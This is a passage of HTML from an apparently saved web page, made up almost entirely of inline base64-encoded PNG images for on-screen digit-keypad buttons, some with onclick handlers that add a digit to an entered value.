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"><img data-savepage-currentsrc="vide.png" data-savepage-src="/tra_cosmos_img/Images-pave-digital/vide.png" src="data:image/png;base64,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"><img data-savepage-currentsrc="0.png" onclick="accumulateValues('0')" data-savepage-src="/tra_cosmos_img/Images-pave-digital/0.png" src="data:image/png;base64,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"><img data-savepage-currentsrc="3.png" onclick="accumulateValues('3')" data-savepage-src="/tra_cosmos_img/Images-pave-digital/3.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADIAAAA2CAYAAAHyqfoxAAAACXBIWXMAAAsTAAALEwEAmpwYAAAKT2lDQ1BQaG90b3Nob3AgSUNDIHByb2ZpbGUAAHjanVNnVFPpFj333vRCS4iAlEtvUhUIIFJCi4AUkSYqIQkQSoghodkVUcERRUUEG8igiAOOjoCMFVEsDIoK2AfkIaKOg6OIisr74Xuja9a89+bN/rXXPues852zzwfACAyWSDNRNYAMqUIeEeCDx8TG4eQuQIEKJHAAEAizZCFz/SMBAPh+PDwrIsAHvgABeNMLCADATZvAMByH/w/qQplcAYCEAcB0kThLCIAUAEB6jkKmAEBGAYCdmCZTAKAEAGDLY2LjAFAtAGAnf+bTAICd+Jl7AQBblCEVAaCRACATZYhEAGg7AKzPVopFAFgwABRmS8Q5ANgtADBJV2ZIALC3AMDOEAuyAAgMADBRiIUpAAR7AGDIIyN4AISZABRG8lc88SuuEOcqAAB4mbI8uSQ5RYFbCC1xB1dXLh4ozkkXKxQ2YQJhmkAuwnmZGTKBNA/g88wAAKCRFRHgg/P9eM4Ors7ONo62Dl8t6r8G/yJiYuP+5c+rcEAAAOF0ftH+LC+zGoA7BoBt/qIl7gRoXgugdfeLZrIPQLUAoOnaV/Nw+H48PEWhkLnZ2eXk5NhKxEJbYcpXff5nwl/AV/1s+X48/Pf14L7iJIEyXYFHBPjgwsz0TKUcz5IJhGLc5o9H/LcL//wd0yLESWK5WCoU41EScY5EmozzMqUiiUKSKcUl0v9k4t8s+wM+3zUAsGo+AXuRLahdYwP2SycQWHTA4vcAAPK7b8HUKAgDgGiD4c93/+8//UegJQCAZkmScQAAXkQkLlTKsz/HCAAARKCBKrBBG/TBGCzABhzBBdzBC/xgNoRCJMTCQhBCCmSAHHJgKayCQiiGzbAdKmAv1EAdNMBRaIaTcA4uwlW4Dj1wD/phCJ7BKLyBCQRByAgTYSHaiAFiilgjjggXmYX4IcFIBBKLJCDJiBRRIkuRNUgxUopUIFVIHfI9cgI5h1xGupE7yAAygvyGvEcxlIGyUT3UDLVDuag3GoRGogvQZHQxmo8WoJvQcrQaPYw2oefQq2gP2o8+Q8cwwOgYBzPEbDAuxsNCsTgsCZNjy7EirAyrxhqwVqwDu4n1Y8+xdwQSgUXACTYEd0IgYR5BSFhMWE7YSKggHCQ0EdoJNwkDhFHCJyKTqEu0JroR+cQYYjIxh1hILCPWEo8TLxB7iEPENyQSiUMyJ7mQAkmxpFTSEtJG0m5SI+ksqZs0SBojk8naZGuyBzmULCAryIXkneTD5DPkG+Qh8lsKnWJAcaT4U+IoUspqShnlEOU05QZlmDJBVaOaUt2ooVQRNY9aQq2htlKvUYeoEzR1mjnNgxZJS6WtopXTGmgXaPdpr+h0uhHdlR5Ol9BX0svpR+iX6AP0dwwNhhWDx4hnKBmbGAcYZxl3GK+YTKYZ04sZx1QwNzHrmOeZD5lvVVgqtip8FZHKCpVKlSaVGyovVKmqpqreqgtV81XLVI+pXlN9rkZVM1PjqQnUlqtVqp1Q61MbU2epO6iHqmeob1Q/pH5Z/YkGWcNMw09DpFGgsV/jvMYgC2MZs3gsIWsNq4Z1gTXEJrHN2Xx2KruY/R27iz2qqaE5QzNKM1ezUvOUZj8H45hx+Jx0TgnnKKeX836K3hTvKeIpG6Y0TLkxZVxrqpaXllirSKtRq0frvTau7aedpr1Fu1n7gQ5Bx0onXCdHZ4/OBZ3nU9lT3acKpxZNPTr1ri6qa6UbobtEd79up+6Ynr5egJ5Mb6feeb3n+hx9L/1U/W36p/VHDFgGswwkBtsMzhg8xTVxbzwdL8fb8VFDXcNAQ6VhlWGX4YSRudE8o9VGjUYPjGnGXOMk423GbcajJgYmISZLTepN7ppSTbmmKaY7TDtMx83MzaLN1pk1mz0x1zLnm+eb15vft2BaeFostqi2uGVJsuRaplnutrxuhVo5WaVYVVpds0atna0l1rutu6cRp7lOk06rntZnw7Dxtsm2qbcZsOXYBtuutm22fWFnYhdnt8Wuw+6TvZN9un2N/T0HDYfZDqsdWh1+c7RyFDpWOt6azpzuP33F9JbpL2dYzxDP2DPjthPLKcRpnVOb00dnF2e5c4PziIuJS4LLLpc+Lpsbxt3IveRKdPVxXeF60vWdm7Obwu2o26/uNu5p7ofcn8w0nymeWTNz0MPIQ+BR5dE/C5+VMGvfrH5PQ0+BZ7XnIy9jL5FXrdewt6V3qvdh7xc+9j5yn+M+4zw33jLeWV/MN8C3yLfLT8Nvnl+F30N/I/9k/3r/0QCngCUBZwOJgUGBWwL7+Hp8Ib+OPzrbZfay2e1BjKC5QRVBj4KtguXBrSFoyOyQrSH355jOkc5pDoVQfujW0Adh5mGLw34MJ4WHhVeGP45wiFga0TGXNXfR3ENz30T6RJZE3ptnMU85ry1KNSo+qi5qPNo3ujS6P8YuZlnM1VidWElsSxw5LiquNm5svt/87fOH4p3iC+N7F5gvyF1weaHOwvSFpxapLhIsOpZATIhOOJTwQRAqqBaMJfITdyWOCnnCHcJnIi/RNtGI2ENcKh5O8kgqTXqS7JG8NXkkxTOlLOW5hCepkLxMDUzdmzqeFpp2IG0yPTq9MYOSkZBxQqohTZO2Z+pn5mZ2y6xlhbL+xW6Lty8elQfJa7OQrAVZLQq2QqboVFoo1yoHsmdlV2a/zYnKOZarnivN7cyzytuQN5zvn//tEsIS4ZK2pYZLVy0dWOa9rGo5sjxxedsK4xUFK4ZWBqw8uIq2Km3VT6vtV5eufr0mek1rgV7ByoLBtQFr6wtVCuWFfevc1+1dT1gvWd+1YfqGnRs+FYmKrhTbF5cVf9go3HjlG4dvyr+Z3JS0qavEuWTPZtJm6ebeLZ5bDpaql+aXDm4N2dq0Dd9WtO319kXbL5fNKNu7g7ZDuaO/PLi8ZafJzs07P1SkVPRU+lQ27tLdtWHX+G7R7ht7vPY07NXbW7z3/T7JvttVAVVN1WbVZftJ+7P3P66Jqun4lvttXa1ObXHtxwPSA/0HIw6217nU1R3SPVRSj9Yr60cOxx++/p3vdy0NNg1VjZzG4iNwRHnk6fcJ3/ceDTradox7rOEH0x92HWcdL2pCmvKaRptTmvtbYlu6T8w+0dbq3nr8R9sfD5w0PFl5SvNUyWna6YLTk2fyz4ydlZ19fi753GDborZ752PO32oPb++6EHTh0kX/i+c7vDvOXPK4dPKy2+UTV7hXmq86X23qdOo8/pPTT8e7nLuarrlca7nuer21e2b36RueN87d9L158Rb/1tWeOT3dvfN6b/fF9/XfFt1+cif9zsu72Xcn7q28T7xf9EDtQdlD3YfVP1v+3Njv3H9qwHeg89HcR/cGhYPP/pH1jw9DBY+Zj8uGDYbrnjg+OTniP3L96fynQ89kzyaeF/6i/suuFxYvfvjV69fO0ZjRoZfyl5O/bXyl/erA6xmv28bCxh6+yXgzMV70VvvtwXfcdx3vo98PT+R8IH8o/2j5sfVT0Kf7kxmTk/8EA5jz/GMzLdsAAAAgY0hSTQAAeiUAAICDAAD5/wAAgOkAAHUwA